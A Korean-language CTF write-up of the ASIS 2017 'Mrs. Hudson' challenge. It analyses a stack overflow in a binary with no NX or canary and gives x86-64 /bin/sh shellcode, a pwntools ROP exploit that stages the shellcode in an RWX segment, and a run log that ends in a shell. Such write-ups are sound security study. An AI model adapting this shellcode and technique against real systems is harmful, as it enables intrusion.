---
layout: post
title: '[CTF] ASIS2017 Mrs.Hudson'
date: '2017-09-30 11:00:00 +0900'
categories: ctf
tags: [bof]
---

- 간단한 BoF
- No NX
- Inject한 shellcode 로 jump 시킬 주소를 어떻게 고정시킬 수 있을까 ?


## A. Write-up

[CTFtime.org / ASIS CTF Finals 2017 / Mrs. Hudson](https://ctftime.org/task/4589)


## B. Basic info

#### 1. Code

코드는 간단한 BoF.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+10h] [rbp-70h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("Let's go back to 2000.");
  return __isoc99_scanf("%s", &v4);
}
```


#### 2. Checksec

Threat mitigation 적용이 되어 있지 않으므로 shellcode injeciton 가능.

```bash
gef)  checksec
[+] checksec for '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson'
Canary                        : No
NX                            : No
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

PLT 함수가 너무 적다. 특히 `read()`, `write()` 도 없다.

```
Address Ordinal Name    Library
0000000000601068        puts    
0000000000601070        __libc_start_main   
0000000000601078        setvbuf 
0000000000601080        __isoc99_scanf  
0000000000601088        __gmon_start__  
```



#### 3. BoF

BoF 는 120 byte 에서 터짐.

#### 4. shellcode

[Minimal x86-64 shellcode for /bin/sh? · System Overlord](https://systemoverlord.com/2014/06/05/minimal-x86-64-shellcode-for-binsh/)

```
\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05
```


## C. Problem

간단한 BoF 이나 어려운 점은 injected shellcode 로 jump 시킬 주소를 어떻게 fix 할 수 있는냐 이다.

`0x00007ffddeb19498`
```
0x00007ffddeb19498│+0x00: 0x4242424241414141     ← $rsp
0x00007ffddeb194a0│+0x08: 0x9090909090909090
0x00007ffddeb194a8│+0x10: 0x9090909090909090

     0x400680 <main+102>       call   0x400520 <__isoc99_scanf@plt>
     0x400685 <main+107>       leave  
 →   0x400686 <main+108>       ret  
```


`0x00007ffc94ec0338`
```
0x00007ffc94ec0338│+0x00: 0x4242424241414141     ← $rsp
0x00007ffc94ec0340│+0x08: 0x9090909090909090
0x00007ffc94ec0348│+0x10: 0x9090909090909090

     0x400680 <main+102>       call   0x400520 <__isoc99_scanf@plt>
     0x400685 <main+107>       leave  
 →   0x400686 <main+108>       ret  
 ```


ALSR 이 걸린 상태에서 inject 한 shellcode 실행 시에 위치 변화 없이 shellcode 에 떨어뜨리기 위한 jump 주소는 어떻게 ???

1. Nop slide : `NOP` 잘 깔아두고, jump ?
2. shellcode 를 정해진 위치에 올려놓을 수는 없을까 ???


## D. Solve 

### 1. Nop slide : `NOP` 잘 깔아두고, jump

ASLR로 stack 위치가 엄청하게 변하는데 nop slide 로 커버할 수 있을까 ??? 어려울 듯....

### 2. shellcode 를 ROP 로 정해진 위치에 올려놓기 

- `scanf("%s", @RWX_AREA)`
- jump and execute `@RWX_AREA`

PLT에 `scanf()` 있으므로 RWX 영역에 ROP로 shellcode 올려놓은 다음에 fixed 위치인 RWX 영역으로 jump 하기.

### `RWX_AREA` : GOT

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-x /media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson
0x0000000000601000 0x0000000000602000 0x0000000000001000 rwx /media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson
```

pwndbg 에서 PLT/GOT 주소 참조.

```
pwndbg> plt
0x400500: puts@plt
0x400510: setvbuf@plt
0x400520: __isoc99_scanf@plt
pwndbg> got
[*] '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

GOT protection: No RELRO | GOT functions: 3

[000000601018] puts@GLIBC_2.2.5 -> 0x400506 (puts@plt+6) ◂— push   0 /* 'h' */
[000000601020] setvbuf@GLIBC_2.2.5 -> 0x400516 (setvbuf@plt+6) ◂— push   1
[000000601028] __isoc99_scanf@GLIBC_2.7 -> 0x400526 (__isoc99_scanf@plt+6) ◂— push   2
```

`0x0000000000601000`  부터 GOT 영역이지만 현재 함수에서 사용하는 GOT table 뒤에 write 해야할 듯.

#### Exploit

```python
""" Variable
"""
pop_rdi      = 0x004006f3         # pop rdi; ret
pop_rsi_r15  = 0x00000000004006f1 # pop rsi; pop r15; ret
scanf_plt    = 0x00400526         # scanf@PLT
scanf_string = 0x0040072b         # %s
bin_x        = 0x0000000000601090 # rwx segment

""" Here we go.
"""
log.info("[*] ASIS CTF 2017: mrs_hudson exploit.")

#Let's go back to 2000.
print conn.recvline()

""" ROP
"""
shellcode = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"

# Scanf("%s", @RWX_AREA)
#       rdi   rsi
rop =  p64(pop_rdi) + p64(scanf_string)
rop += p64(pop_rsi_r15) + p64(bin_x) + p64(0xdeadbeef)
rop += p64(scanf_plt)
rop += p64(bin_x)

conn.sendline("A"*120 + rop)
conn.sendline(shellcode)
```

## Full exploit

[awesome-ctf-wargame/solv.py at master · 2O2L2H/awesome-ctf-wargame](https://github.com/2O2L2H/awesome-ctf-wargame/blob/master/ctf/2017/asis/pwnable/mrs_hudson/solv.py)

#### Execution

```shell
$ python solv.py
[+] Starting local process './mrs._hudson': pid 6876
[*] running in new terminal: /usr/bin/gdb -q  "/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson" 6876
[+] Waiting for debugger: Done
[*] '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/asis/pwnable/mrs_hudson/mrs._hudson'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] [*] ASIS CTF 2017: mrs_hudson exploit.
[DEBUG] Received 0x17 bytes:
    "Lets go back to 2000.\n"
Let's go back to 2000.

[DEBUG] Sent 0xb1 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000070  41 41 41 41  41 41 41 41  f3 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000080  2b 07 40 00  00 00 00 00  f1 06 40 00  00 00 00 00  │+·@·│····│··@·│····│
    00000090  90 10 60 00  00 00 00 00  ef be ad de  00 00 00 00  │··`·│····│····│····│
    000000a0  26 05 40 00  00 00 00 00  90 10 60 00  00 00 00 00  │&·@·│····│··`·│····│
    000000b0  0a                                                  │·│
    000000b1
[DEBUG] Sent 0x1a bytes:
    00000000  48 bb d1 9d  96 91 d0 8c  97 ff 48 f7  db 53 31 c0  │H···│····│··H·│·S1·│
    00000010  99 31 f6 54  5f b0 3b 0f  05 0a                     │·1·T│_·;·│··│
    0000001a
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x84 bytes:
    'uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)\n'
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
```









